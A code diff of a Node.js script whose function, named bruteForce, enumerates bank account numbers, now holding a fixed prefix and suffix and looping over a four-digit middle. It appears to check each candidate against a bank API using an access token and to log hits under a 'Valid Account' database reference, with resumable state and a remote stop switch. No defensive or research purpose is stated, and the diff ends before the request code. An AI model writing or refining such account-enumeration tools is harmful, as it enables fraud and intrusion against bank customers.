@@ -17,16 +17,18 @@ const validRef = db.ref('Valid Account');
 const controlRef = db.ref('control');
 
 const BANK_CODE = process.env.BANK_CODE;
-const LAST_4_DIGITS = process.env.LAST_4_DIGITS;
 const API_URL = process.env.API_URL;
 const TOKEN = process.env.API_TOKEN;
 
-let start = 1;
+const PREFIX = '069';
+const SUFFIX = '471';
+
+let start = 0;
 let stop = false;
 
 if (fs.existsSync('state.json')) {
   const state = JSON.parse(fs.readFileSync('state.json', 'utf8'));
-  start = state.last || 1;
+  start = state.last || 0;
 }
 
 controlRef.child('status').on('value', snapshot => {
@@ -34,16 +36,16 @@ controlRef.child('status').on('value', snapshot => {
 });
 
 async function bruteForce() {
-  console.log(chalk.green(`\n🚀 Starting from prefix: ${start.toString().padStart(6, '0')}`));
-  for (let i = start; i <= 999999; i++) {
+  console.log(chalk.green(`\n🚀 Starting from middle: ${start.toString().padStart(4, '0')}`));
+  for (let i = start; i <= 9999; i++) {
     if (stop) {
       console.log(chalk.yellow('⏸️ Stopped by control panel.'));
       saveState(i);
       break;
     }
 
-    const prefix = i.toString().padStart(6, '0');
-    const accountNumber = prefix + LAST_4_DIGITS;
+    const middle = i.toString().padStart(4, '0');
+    const accountNumber = `${PREFIX}${middle}${SUFFIX}`;
     const timestamp = new Date().toISOString();
 
     try {
